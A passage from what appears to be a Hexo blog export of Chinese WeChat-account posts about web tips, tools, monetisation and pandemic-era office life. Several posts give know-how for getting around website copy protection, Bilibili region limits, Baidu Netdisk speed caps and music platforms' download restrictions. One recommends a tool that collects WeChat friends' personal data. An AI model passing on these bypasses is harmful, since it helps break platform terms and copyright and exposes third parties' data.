那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我的微信公众号开始赚钱了]]></title>
    <url>%2F2020%2F04%2F20%2F%E6%88%91%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%A7%8B%E8%B5%9A%E9%92%B1%E4%BA%86%2F</url>
    <content type="text"><![CDATA[我的公众号2017年申请的，不过那时候一直没怎么运营，现在想想真的浪费了，那是公众号的黄金时代，后来因为知乎上一个问题去年5月份又重新开始运营起来，这一晃就快一年了。 看我的简书主页https://www.jianshu.com/u/6640b25deaa4 已经更新了119篇原创文章了，近10万字。 公众号还做了个整理2019 年公众号 苏生不惑 近百篇原创文章整理 公众号目前完全由我一个人打理，平常要上班，一般只有周末写文章，然后每周更新2篇左右，实在忙不过来，还好在新浪上班不用996，周末有自己的时间。 写文章也没有什么精美的排版，这里感谢下简书的markdown编辑器，写好后再通过公众号编辑器转一下就行了，看起来还算可以，有兴趣的朋友看我之前的文章我是如何用 Markdown 写公众号文章的 下面说回到公众号赚钱，最基础的就是公众号流量主（500粉丝开通）。只要有人点你的文章广告就有钱，一般一个点击5毛-1块左右，当然很少人点的，所以几乎每天就是2块左右，ps：不要想着拉人帮点，如果曝光和点击量比例异常，微信检测到会处罚，严重的直接封了。 快一年了才700多，太难了，所以公众号赚钱还得靠接商业广告，比如最近接的一个培训机构的广告文章某厂面试、直接被面试官给吊打了 广告主通过公众号留的微信联系我，具体价格就不说了，大家看上面的阅读数可以看出来。 我的公众号开始赚钱了，这个比流量主赚得太容易了，一个月接几次就够房租了。不过目前接商业广告都是被动的，不知道去哪里能找这些广告主，多联系下，没准下次他们需要推广告的时候就能想到你呢，不知道大家有什么好的渠道？ 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[生成一份你的微信好友数据报告]]></title>
    <url>%2F2020%2F04%2F20%2F%E7%94%9F%E6%88%90%E4%B8%80%E4%BB%BD%E4%BD%A0%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%A5%BD%E5%8F%8B%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%91%8A%2F</url>
    <content type="text"><![CDATA[微信现在是国民APP了，加的人多了，有没有想过分析下自己的微信好友都分布在哪，这里推荐一个工具 https://github.com/shengqiangzhang/examples-of-web-crawlers，生成一份属于你的微信个人数据报告,包括昵称、性别、年龄、地区、备注名、个性签名、头像、群聊等，使用非常简单，双击软件exe文件执行弹出二维码用微信扫码确认登录后会登录你的微信拼接你的微信好友头像进行人脸识别。一会执行完在本地生成文件微信个人数据报告.html 微信好友地区分布可以看到我的微信好友中广东的最多广东好友中深圳的最多 微信好友性别比例我的好友中男性居多 认识的好友比例这个是根据备注来统计的 特殊好友分析统计不让我看朋友圈和我不看朋友圈的好友 共同群聊分析看看谁和你在同一个群聊。 微信好友头像拼图把我的所有微信好友头像拼为一张图，是不很震撼。 赶紧来试试吧，有问题在文末留言。 推荐历史文章： 十多年过去了，2006 年神剧《武林外传》还有后 80 回吗？ 2015 韩国神剧《请回答1988》 微信红包最新玩法：滚动数字红包 周杰伦电影《不能说的秘密》 给你的微信头像加 N95 口罩 春节假期无聊？来看哈利波特系列电影 春节假期无聊？来看蜘蛛侠系列电影 春节假期无聊？来看指环王系列电影 2020 第 92 届奥斯卡金像奖获奖电影合集 喜马拉雅/蜻蜓 fm 音频下载工具分享 百度网盘不限速下载文件工具 小区疫情查询工具，看看自己小区附近是否有疫情 情人节如何哄女朋友？ 免费下载百度文库工具 分享文件除了百度网盘还有什么选择？]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些好玩的网站]]></title>
    <url>%2F2020%2F04%2F20%2F%E9%82%A3%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[苏生不惑第122 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前分享过 那些有意思的网站 那些有意思的网站（二） 那些好玩的生成器网站 那些好玩的生成器网站（二） 这里继续分享那些有好玩的网站。 色差辨识度来测测你眼睛对色差的辨识度， 找出所有色块里颜色不同的一个http://www.cuishuai.cc/game/https://weibo.com/5940888202/Iwl3xgiuG有60秒倒计时时间。 看你能玩到几关 微信扫码开始玩，和朋友圈的好友pk下吧。 声音地图声音地图是通过把带有地理信息标记的实地录音，在数字地图上进行聚合展示的一种表现形式，来听听来自大江南北不同声音的声音地图，看看有没有你老家的方言 https://www.ear0.com/map 在地图上选择北京 北海公园 听大爷边吹边唱，你可以选择自己感兴趣的某个地方声音。音频可以用idm直接下载到本地 类似的网站还有金庸地图，地图上展示金庸小说人物所到过地点发生的事件。 https://www.ageeye.cn/map/12518/?static=0#3/0/0/88.7695/41.5901 事件搜索一种将事件、概念、逻辑、实时学习、多类知识库实时更新串起来的知识服务新模式，名字学迹取自“学事理，知行迹” https://xueji.zhiwenben.com/ ，这个有点类似之前介绍的 magi 比谷歌更有意思的知识提取搜索引擎 magi ，不过它只能搜索 事件。 日本动漫识图https://trace.moe 是一个存储了大量番剧并对番剧画面进行了逐帧的索引,只要你能给出番剧的截图, 它就可以找到截图对应的番剧,以及截图对应的时间轴。 它还是开源的https://github.com/soruly/trace.moe，提供api https://trace.moe/?url= https://t.bilibili.com/topic/name/%E9%98%85%E7%89%87%E6%97%A0%E6%95%B0/feed 从这里选一张网上看到一张动漫图，不知道出处是哪，来这里搜吧https://saucenao.com/，https://trace.moe/https://gfsoso.fcczp.com/image.html比如这张图可以搜到是石上真男人 如果还搜不到用谷歌吧。 在线玩魔方在线玩魔方，可切换3种模式：普通，公式播放，动画制作 https://huazhechen.gitee.io/cuber/ 能不能好好说话社交平台上通过拼音首字母缩写指代特定词句的情况越来越多，为了让更多人能勉强理解这一门另类沟通方式、有人做了这个划词转义工具 https://lab.magiconch.com/nbnhhsh/ ， awsl 都什么玩意儿，能不能好好说话 ！ APP https://www.coolapk.com/apk/260094有个类似的 叫小鸡词典 🤔 https://jikipedia.com/ 黑白图片转彩色将黑白照片转彩色 https://colourise.sg/ https://demos.algorithmia.com/colorize-photos看看风华绝代的张国荣效果图推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 bilibili(b站)升级到BV号了，还想用av号怎么办 如何搞定某些网站不让复制文字 关于 苏生不惑 公众号 不想下载那么多音乐软件？全网音乐在线听和下载 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何搞定某些网站不让复制文字]]></title>
    <url>%2F2020%2F04%2F17%2F%E5%A6%82%E4%BD%95%E6%90%9E%E5%AE%9A%E6%9F%90%E4%BA%9B%E7%BD%91%E7%AB%99%E4%B8%8D%E8%AE%A9%E5%A4%8D%E5%88%B6%E6%96%87%E5%AD%97%2F</url>
    <content type="text"><![CDATA[苏生不惑第121 篇原创文章，将本公众号设为星标，第一时间看最新文章。 浏览某些网站的时候，看到一段不错的话想复制下来，结果竟然要登录，甚至你都选择不了文字，因为被禁用了，下面就分享几种解决方案。 浏览器控制台针对使用jQuery的网站（别管是不是先试试），比如某doc ，复制文字的时候会弹出个登录框。 按F12或者右键检查打开控制台，在console里输入$=0，原理就是破坏网站的js执行。 之后就可以复制了。 有些网站连右键和F12都禁止了怎么办？随便打开一个网站先打开控制台再复制网址打开。 如果$=0无效，在设置里勾选Disable JavaScript，复制完之后记得再改回去。 如果还不生效怎么办？安装Chrome扩展吧。 Chrome 扩展安装 simple allow copy 这个扩展 https://chrome.google.com/webstore/detail/simple-allow-copy/aefehdhdciieocakfobpaaolhipkcpgc 或者破解右键锁 https://chrome.google.com/webstore/detail/enable-right-click/gpeddepmnbmkjfnhifmggnjdggibjjkf，具体安装chrome扩展方法见之前的文章[上不了谷歌如何安装 Chrome 扩展？](https://mp.weixin.qq.com/s/xC9K_z7zpmAIEzUK6s1x3w) 安装后打开网站，比如 b站一篇文章 https://www.bilibili.com/read/cv5338629 ，点击扩展图标开启后就能直接复制网页上的文字了。 对知乎的 申请转载 同样有效。 如果你想编辑下再复制，推荐微信同步助手这个扩展 https://chrome.google.com/webstore/detail/%E5%BE%AE%E4%BF%A1%E5%90%8C%E6%AD%A5%E5%8A%A9%E6%89%8B/hchobocdmclopcbnibdnoafilagadion选择提取文章并同步，然后就可以任意编辑了。 油猴脚本关于油猴脚本之前写过好几篇了，点进去看看吧： Chrome 浏览器扩展神器油猴 搜不到你想看的电子书/音乐/电影？一个油猴脚本帮你搞定 2020 年 3 月最新使用idm+油猴加速下载百度网盘文件方法 2020 年 4 月最新使用idm+油猴加速下载百度网盘文件方法 推荐 网页限制解除（精简优化版） https://greasyfork.org/zh-CN/scripts/41075 ，直接安装就行。 安装脚本后打开禁止复制的网页就能直接复制了。 如果你想突破b站的版权限制，推荐 解除B站区域限制的脚本 https://greasyfork.org/zh-CN/scripts/25718这个在之前的文章写过 那些你可能不知道的 bilibili 奇技淫巧 ，有了这个脚本就能突破观看限制了。 另外推荐一个针对知乎的知乎网页助手https://greasyfork.org/zh-CN/scripts/384172 ocr如果以上方法还不行（这种网站比较少），只能用ocr识别了，可以看看之前文章那些你可能不知道的 ocr 图片文字识别工具 里的天若ocr（公众号内回复 ocr 获取软件）。 识别后在ocr软件内复制，不过你要复制的文字比较多就不大方便了，而且ocr不能保证100%识别正确，还有什么更好的方法欢迎在文末留言。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 bilibili(b站)升级到BV号了，还想用av号怎么办 那些好玩的生成器网站 关于 苏生不惑 公众号 不想下载那么多音乐软件？全网音乐在线听和下载 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 年 4 月使用 Aria2 加速下载百度网盘文件]]></title>
    <url>%2F2020%2F04%2F13%2F2020-%E5%B9%B4-4-%E6%9C%88%E4%BD%BF%E7%94%A8-Aria2-%E5%8A%A0%E9%80%9F%E4%B8%8B%E8%BD%BD%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[苏生不惑第120 篇原创文章，将本公众号设为星标，第一时间看最新文章。 开始文章前说下之前文章关于 苏生不惑 公众号 5个红包的关键词： 第一个是谷歌，看过我之前文章应该很清楚了。第二个是周杰伦和桂纶镁的电影《不能说的秘密》。第三个是那些我常听的中文播客节目 这里的《我来过北京》，搜索下就能找到。第四个是https://www.weibo.com/2717930601/ICNUKqJ36 这条微博的摩斯电码，找个解码网站就能得到关注苏生不惑涨姿势。第五个在之前文章那些你可能不知道的网络冷知识奇技淫巧 提过，百度解蜜 75009208 得到支付宝口令表白苏生不惑 。 关于百度网盘之前写过了 2020 年 3 月最新加速下载百度网盘文件方法 2019年11月最新使用油猴加速百度网盘下载方法 2019 年 12 月最新加速百度网盘下载方法 那些你可能不知道的百度文库/网盘快速下载工具 没有提取码怎么获取百度网盘资源？ 还是有小伙伴出现403错误或者没有权限，不过我没碰到。 如果更换应用id还不行，那就试试今天介绍的 Aria2 吧，下载速度也能到2MB/s。 aria2 Aria2是一款自由、跨平台命令行界面的下载管理器，该软件根据GPLv2许可证进行分发。支持的下载协议有：HTTP、HTTPS、FTP、Bittorrent和Metalink。 它是开源的 https://github.com/aria2/aria2 ， 在命令行执行 aria2 文件地址 来下载，比如下载个文件 当然用命令行这样比较麻烦，有更好用的带界面的 AriaNG https://github.com/mayswind/AriaNg，aria2webUI https://github.com/ziahamza/webui-aria2 ，https://aria2c.com/ 这里推荐AriaNG（公众号内回复 百度网盘 获取），下载后双击start.bat这样会开启6800端口服务，注意这个窗口不要关闭。 然后打开 https://aria2c.com/ 或者 https://ziahamza.github.io/webui-aria2/ 配置JSON-RPC Path 为http://localhost:6800/jsonrpc 然后添加任务下载，如果下载BT速度慢可以试试搭配热门 Tracker https://github.com/XIU2/TrackersListCollection ，可以有效提高 BT 下载速度。很快下载完了，这里只是测试用aria2手动下载文件，你可以直接看下面。 下面开始用aria2加速百度网盘下载，同样和之前用idm一样需要先安装好油猴扩展和网盘助手脚本，具体看之前的文章2020 年 3 月最新加速下载百度网盘文件方法 然后再安装 YAAW for Chrome这个扩展 https://chrome.google.com/webstore/detail/yaaw-for-chrome/dennnbdlpgjgbcjfgaohdahloollfgoc ，关于安装和使用Chrome扩展看我之前的文章上不了谷歌如何安装 Chrome 扩展？，这个扩展支持任意链接下直接右键导出到 YAAW下载。 和之前idm一样选中文件后在生成链接弹出的窗口中，右键点击 ARIA2 RPC提示开始下载。 然后点击YAAW for Chrome扩展图标可以看到文件开始下载了，不过文件名随机的，下载完需要自己改，速度有2.56MB/s。 打开上面下载AriaNG里的浏览器打开这个文件.html文件一样。 可以看到命令行在下载。下载的文件名c9ad8726c0eba8109ff4161db6ba85f1手动改为mp4后缀可以正常播放。我这里录制了个GIF 。 下载完后扩展会有提示，下载的文件在download目录，记得把文件名改下。 这个下载速度跟使用idm 差不多，能到2MB多，而且压缩文件不再限制300MB，还能下载文件夹（改为zip解压），不过就是配置还有点复杂，你要是能折腾推荐使用这个（我觉得按上面的步骤来没什么问题），还有什么问题可以在文章末尾留言。 如果你还是搞不定，可以考虑最近新出的pdown 。 pdown 这是一个最新的百度网盘下载器https://github.com/pdown2020/pdown （公众号内回复 百度网盘 获取） ，软件是单文件.exe(5MB) ，无需安装,下载后双击直接运行，直接粘贴完整的百度分享链接和提取码就可以下载了，不需要登录你的百度账号，不过单个文件限制最大100MB，链接内所有文件的总限制最大500MB。 PDown的初衷只是方便大家临时应急用用而已，所以有很多的限制，正常情况下限速300kb/s，比idm还是慢不少。 输入网盘地址 和提取码。 开始解析。如果文件大了会有提示下不了。我这里录制了个GIF ，平均速度600K/s左右，如果下载的文件不大推荐用这个。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 bilibili(b站)升级到BV号了，还想用av号怎么办 那些好玩的生成器网站 关于 苏生不惑 公众号 不想下载那么多音乐软件？全网音乐在线听和下载 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于 苏生不惑 公众号]]></title>
    <url>%2F2020%2F04%2F13%2F%E5%85%B3%E4%BA%8E-%E8%8B%8F%E7%94%9F%E4%B8%8D%E6%83%91-%E5%85%AC%E4%BC%97%E5%8F%B7%2F</url>
    <content type="text"><![CDATA[苏生不惑第119 篇原创文章，将本公众号设为星标，第一时间看最新文章。 最近来了不少小伙伴关注，于是就写写关于这个公众号，本人目前就职于新浪（北京），关于新浪可以看我之前的文章我在新浪的一天工作日常 和 疫情下的新浪工作日常，还有如何提取公积金 9 天到账，这个号目前完全由我一人打理，从2019年5月开始每周更新原创文章（早上8点20发布），坚持快一年了。 点击公众号菜单里的历史文章可以看我发过的所有文章，主要分享些有趣实用的网络冷知识和工具资源，助你更高效地使用互联网。 历史文章里几乎都是都是我原创写的文章（有原创标志，目前原创118篇，还在持续更新），都是我一个个字敲出来的，然后配图校对，一篇文章至少花费2-3个小时，比如之前这篇2020 年 3 月最新加速下载百度网盘文件方法 周末花了4个小时。 不像有些号经常转载他人的文章，可以每天更新，而我由于平常上班忙，只能周末抽空写文章，所以每周只能更新2-3篇，没有标题党，都是干货，但愿没有浪费你时间，还能给你带来一点价值，对你有所帮助。 之前我分类整理过2019 年公众号 苏生不惑 近百篇原创文章整理，还有精选文章，有兴趣可以看看，当然也可以在输入框里搜索关键词，方便你查找想看的文章。 这里再整理下今年发过的文章： 2019 年我在知识星球上都发了些什么 那些有意思的谷歌/百度搜索彩蛋 那些有意思的网站彩蛋 2019 各大 APP 年度报告整理 微软全新浏览器 Microsoft Edge 比 谷歌 Chrome 好用吗？ 2020 新年福利，直接现金红包抽奖 快速了解新型肺炎疫情最新动态 10 秒钟给你的微信头像添加口罩 关注腾讯较真和微博辟谣，拒绝新型肺炎谣言 春节假期在家无聊？来这里看看 用知识抗击疫情，机械工业/电子工业/清华大学等出版社免费开放电子书阅读 来看看你所在小区附近是否有新型肺炎疫情 那些有意思的网站（二） 身份证号码的秘密 那些实用的 Chrome 扩展神器（三） 如何备份可能被删的公众号文章和网页 如何将视频轻松转换为 GIF 如何轻松的将文字转语音 分析你的浏览器历史记录，看看你喜欢访问哪些网站 你还没买到口罩吗？ 那些好玩的生成器网站（二） 搜不到你想看的书/音乐/电影？一个油猴脚本帮你搞定 –..—.–..-.-/-..–…-….–./——.-.-…-./-.-..–…..-.- 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 那些你可能不知道的网络冷知识奇技淫巧 那些你可能用得上的在线办公神器 上不了谷歌如何安装 Chrome 扩展？ 那些你可能用得上的在线办公神器（二） bilibili(b站)升级到BV号了，还想用av号怎么办？ 2020 年 3 月最新加速下载百度网盘文件方法 如何优雅的对网页截取长图 2020 年 4 月 4 日,互联网集体变灰 不想下载那么多音乐软件？全网音乐在线听和下载 疫情下的新浪工作日常 除了原创当然偶尔也会发广告文章（人都是要恰饭的，也为了将这个公众号长久运营下去），大家帮忙点击文章支持下就好，可以的话平常帮忙转发支持下就更好了，公众号会不断发福利（如现金红包），比如之前的：–..—.–..-.-/-..–…-….–./——.-.-…-./-.-..–…..-.-2020 新年福利，直接现金红包抽奖 2019 年公众号 苏生不惑 近百篇原创文章整理 无套路，公众号 苏生不惑 抽奖送现金红包 说到这里，本文也是来发福利的：5个16元的支付宝红包 。 1.在公众号后台回复我常用的浏览器。2.我文章里用得最多的截图来自一部电影，在公众号后台回复这部电影名。3.之前文章里发过一条叶清老师的音频，在公众号后台回复这个音频名。4.我刚在微博上发了个彩蛋，支付宝口令就在那了。5.我在百度搜索里留了个数字75009208给大家，支付宝口令就在那了。 回复正确的话会自动给你一个16元的支付宝口令红包，先到先得，祝好运了。 另外在本文下留言（关于对公众号的建议或者吐槽，不要发无关留言哈），只要显示在本文留言加我微信获得微信红包1.6元。 最后为了不错过我的文章，麻烦将本公众号设置为星标，这样就不用在你关注的那么多公众号里翻了 。 ps:如果有什么问题可以在文章下留言或者加我微信，我白天上班，晚上看到都会及时回复你的。下面是跟加我的一些小伙伴交流信息。偶尔也在微信群里发红包。 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[疫情下的新浪工作日常]]></title>
    <url>%2F2020%2F04%2F13%2F%E7%96%AB%E6%83%85%E4%B8%8B%E7%9A%84%E6%96%B0%E6%B5%AA%E5%B7%A5%E4%BD%9C%E6%97%A5%E5%B8%B8%2F</url>
    <content type="text"><![CDATA[苏生不惑第118 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于工作日常之前写过我在新浪的一天工作日常，为什么又写下这篇文章呢，因为前几天看到这条微博https://weibo.com/1393017020/IxZ6Xy5jA?type=comment 这是一条值得看评论的微博，40万赞和3800评论，评论里有很多网友拍下的记录。 于是我也拍下一些照片记录下来，也许n年后也是一份珍贵的记录。 由于疫情的影响整个2月和3月初都在家办公，3月中旬回北京的时候，动车上难得的很多空座位。 回到北京后地铁上也没多少人。有很多空座位，大家都戴起了口罩。 回到小区发现封闭了。 只能从另外一个口进去，门口有人负责让你填写行程信息，然后开始居家隔离14天。用的京心相助小程序。 居家隔离告知书 拉进小区的隔离群，有需要找他们。隔离区间都吃的田老师外卖（为什么吃这个？我习惯了）。隔离满14天后去小区领取个临时出入证，然后量体温，正常就可以出去自由活动了。发现还有很多餐饮店还没开始营业，影响不小。去吃饭得登记和量体温。之后就可以去公司上班了，地铁可以自动测温。 公司班车上也是隔开坐。 到公司门口量体温，出示通行证。没有通行证进不去。 在 国务院客户端 小程序 查行程。排队检查 终于进公司了。 我还特意发了条朋友圈。公司食堂暂时停止供应，改为领取盒饭。 这周开始营业了，不过也是盒饭形式，成本应该增加不少，坐对面吃饭也是隔离着，吃饭不交谈。 乘电梯排队保持距离。电梯内提供卫生纸按楼层。 会议室暂时关闭了。 下面晒几张公司内部的标语，猜测是微博部门同事出的。 再到公司楼下逛逛，居然还有这个。 之前在家上班不用戴口罩，现在上班时也要一直戴着口罩，挺难受的，出门第一件事也是戴口罩（还好公司提供口罩），疫情快点过去回归正常吧。 北京现在还很严，估计五一回来也要隔离14天。高考都延期一个月了，学生朋友可能还没开学，不知道对你的工作学习和生活影响大吗？欢迎在文章下留言。 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不想下载那么多音乐软件？全网音乐在线听和下载]]></title>
    <url>%2F2020%2F04%2F13%2F%E4%B8%8D%E6%83%B3%E4%B8%8B%E8%BD%BD%E9%82%A3%E4%B9%88%E5%A4%9A%E9%9F%B3%E4%B9%90%E8%BD%AF%E4%BB%B6%EF%BC%9F%E5%85%A8%E7%BD%91%E9%9F%B3%E4%B9%90%E5%9C%A8%E7%BA%BF%E5%90%AC%E5%92%8C%E4%B8%8B%E8%BD%BD%2F</url>
    <content type="text"><![CDATA[苏生不惑第117 篇原创文章，将本公众号设为星标，第一时间看最新文章。 我平常手机上用网易云音乐APP听歌，pc上用 music.163.com ，但有些音乐网易没有版权，需要在腾讯或者虾米上听，而且有些歌还要下载他们的客户端，即使下载了客户端有些歌也下载不了。 这里推荐几个可以听全网音乐的工具和网站。 listen1Listen 1可以搜索和播放来自网易云音乐，虾米，QQ音乐，酷狗音乐，酷我音乐网站的歌曲，让你的曲库更全面。再也不必为了听一首歌打开网易云音乐搜索，再打开 QQ 音乐了 https://listen1.github.io/listen1/ 它提供 chrome 插件 和桌面版。 如何安装Chrome插件可以看之前的文章 上不了谷歌如何安装 Chrome 扩展？ ，安装后点击扩展图标跳转到listen1首页 chrome-extension://lnjgfenhfghblmnkmgfodbpmdgehdala/listen1.html 也有人做了个类似的网易云音乐在线版https://music.sl1673495.now.sh/#/discovery 里面居然还有b站的音乐，可以在线听。 在网易云音乐tab 搜索 赵雷 点击播放在线听 ，也可以直接跳转到网易云音乐听 https://music.163.com/#/song?id=29567191打开控制台可以找到这首歌的播放地址http://m701.music.126.net/20200329143528/ab99139308acd212858910377be4c5e1/jdyyaac/055a/545c/0609/20b69b6ad3c67f3bf9ec1c6d9f0ce253.m4a，直接下载就好虽然是m4a文件格式，用QQ影音这种播放器也能播放的。ps: 网易云音乐可以通过https://music.163.com/song/media/outer/url?id=1303026566.mp3 替换歌曲id直接下载，如果想下载网易的视频参考之前的文章如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ QQ音乐是一样的，这首歌下载地址http://ws.stream.qqmusic.qq.com/C4000019sHn41iQY8b.m4a?guid=10000&amp;vkey=5DBB9B2F0BDADE20D6374BDF1D53A0152DAB824E2D10793C2E22CCCB206CD5862AFED4C42A5237B125AA358264B300256F501C45E6049FAB&amp;uin=0&amp;fromtag=66虾米音乐播放下载地址http://s128.xiami.net/326/76326/2013969781/1773648048_1549018469224_9348.m4a?ccode=xiami__&amp;expire=86400&amp;duration=326&amp;psid=e75f2f0aecd9045a037d705521f21a3e&amp;ups_client_netip=null&amp;ups_ts=1585462743&amp;ups_userid=0&amp;utid=&amp;vid=1773648048&amp;fn=1773648048_1549018469224_9348.m4a&amp;vkey=B42490f47c5f62de5200de49d47a8a8ae，知道如何获取歌曲地址就可以方便的下载任何一首免费的歌了。 如果对样式不喜欢可以自己设置。还可以导入歌单，比如这个https://music.163.com/playlist?id=4926327811导入后直接听这个歌单里的歌。使用客户端效果一样的。 洛雪音乐助手这是一个基于 Electron + Vue 开发的音乐软件 https://github.com/lyswhut/lx-music-desktop ，支持Windows mac和Linux系统。 安装软件后搜索 周杰伦 ，可以在线听。也可以下载，普通音质是mp3格式 myfreemp3这是一个在线网站 http://tool.liumingye.cn/music/?page=audioPage&amp;type=migu&amp;name=%E5%91%A8%E6%9D%B0%E4%BC%A6 ，支持在线听和下载。 以上软件和网站在公众号内回复 音乐 获取。 推荐历史文章: 如何发一条空白的朋友圈 2019 年公众号 苏生不惑 近百篇原创文章整理 那些有意思的谷歌/百度搜索彩蛋 如何备份可能被删的公众号文章和网页 bilibili(b站)升级到BV号了，还想用av号怎么办 那些好玩的生成器网站 2020 年 3 月最新加速下载百度网盘文件方法 关于 苏生不惑 公众号 那些你可能不知道的网络冷知识奇技淫巧 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020 年 4 月 4 日,互联网集体变灰]]></title>
    <url>%2F2020%2F04%2F13%2F2020-%E5%B9%B4-4-%E6%9C%88-4-%E6%97%A5-%E4%BA%92%E8%81%94%E7%BD%91%E9%9B%86%E4%BD%93%E5%8F%98%E7%81%B0%2F</url>
    <content type="text"><![CDATA[苏生不惑第116 篇原创文章，将本公众号设为星标，第一时间看最新文章。 今天是个特殊的日子，既是清明节，也是全国哀悼日今天，全中国默哀三分钟。 国内大多数互联网公司也在这一天把网站或APP集体变灰，用以悼念抗击新冠肺炎疫情斗争中牺牲的烈士和逝世的同胞。 这里就整理下国内几大互联网公司网站首页，希望多年后人们还能记得这个特殊的日子。 腾讯首页http://www.qq.com/ 上一次2008年512地震哀悼日的腾讯首页可以在互联网档案馆 跟随时光机回到过去看看 2005 年的百度/腾讯/淘宝/谷歌找到，可惜只有5月9号和29号的记录http://web.archive.org/web/20080529163757/http://www.qq.com/ 我这里也生成一个今天的腾讯首页档案地址 https://web.archive.org/web/20200404071834/https://www.qq.com/ ，这个地址可永久访问的。 腾讯视频 http://v.qq.com/腾讯旗下部分公众号头像也集体变灰了。 阿里巴巴淘宝首页 https://www.taobao.com/支付宝 APP 首页 百度首页 http://baidu.com/百度新闻http://news.baidu.com/ 互联网档案馆有2008年5月19日的百度首页 http://web.archive.org/web/20080519080646/http://www.baidu.com/ 今天和2008年5.12的百度流量 档案地址 https://web.archive.org/save/http://www.baidu.com/ 新浪首页 https://www.sina.com.cn/新浪新闻 https://news.sina.com.cn/新浪新闻不用在互联网档案馆查，通过URL就可以找到，这个之前的文章有写过那些你可能不知道的网络冷知识奇技淫巧，看看2008年5月19日的新浪新闻首页http://news.sina.com.cn/head/news20080519am.shtml 微博热搜 微博热门话题微博话题#清明祭#微博话题#全国性哀悼活动# b站首页 https://www.bilibili.com 直播 https://live.bilibili.com/21686237 动态档案地址 https://web.archive.org/web/20200404072536/https://www.bilibili.com/ 知乎首页 https://www.zhihu.com/hot档案地址 https://web.archive.org/web/20200404072740/https://www.zhihu.com/signin?next=%2Fhot 喜马拉雅首页 https://www.ximalaya.com/ 网易首页 https://www.163.com/网易云音乐首页 https://music.163.com/ 档案地址 https://web.archive.org/web/20200404072848/https://www.163.com/ 头条首页 https://www.toutiao.com/ 爱奇艺首页 https://www.iqiyi.com/档案地址 https://web.archive.org/web/20200404073002/https://www.iqiyi.com/ 优酷首页直接跳转到 https://t.youku.com/yep/page/pc/spyyb3uzon 档案地址 https://web.archive.org/web/20200404073449/https://www.youku.com/ 疫情还没有结束，出门记得戴口罩，分享2张新浪内部的标语。 公众号 苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何优雅的对网页截取长图]]></title>
    <url>%2F2020%2F04%2F01%2F%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E7%9A%84%E5%AF%B9%E7%BD%91%E9%A1%B5%E6%88%AA%E5%8F%96%E9%95%BF%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[苏生不惑第115 篇原创文章，将本公众号设为星标，第一时间看最新文章。 最近写文章想截个长图，才发现一直使用的QQ早有这个功能了，这里就整理几个pc上网页长截图的方案。 qq滚动截图qq截图应该很多人用过，我平常挂qq也只是为了方便使用截图，但你可能没怎么用过qq滚动截图，具体看官方网站说明 https://kf.qq.com/faq/190624amau22190624ArMrE7.html，看我用软件gifcam（在公众号回复 gif 获取）录制的GIF操作。点击长截图后往下滚动，截图效果： 除了滚动截图qq还有屏幕识图（就是ocr了）。识图效果还行，就是不方便复制，还是天若ocr软件更好用点。 顺便说下怎么用 QQ 截图右键菜单 ，这个在之前的文章说过那些你可能不知道的网络冷知识奇技淫巧，先按住alt+ctrl再单击右键就可以用QQ对右键菜单截图了。 FireShot这是个Chrome扩展https://chrome.google.com/webstore/detail/take-webpage-screenshots/mcbpblocgmgfnpjjppndjkmgjaogfceg，能捕捉网页截图，编辑并将它们保存为PDF，JPEG，GIF，PNG或BMP ，安装 Chrome扩展见文章上不了谷歌如何安装 Chrome 扩展？ 这里打开上不了谷歌如何安装 Chrome 扩展？这篇文章,选择捕捉选定区域。然后复制截取的长图。 FastStoneFastStone Capture 是一款体积小巧、功能强大、简单易用的屏幕捕捉工具，集屏幕截图、图像编辑、视频录制功能于一身。 点击捕获滚动窗口，然后滚动鼠标下滑，按esc停止 ，选中要截取的范围。生成的长图效果跟QQ差不多。 如果不想使用软件其实谷歌浏览器就自带截图功能。 浏览器控制台按F12打开控制台，然后 Ctrl+Shift+P 输入Capture full size screenshot这样会截取整个网页，如果想截取网页的一部分，选中截取的元素后 Ctrl+Shift+P再输入 Capture node screenshot截图 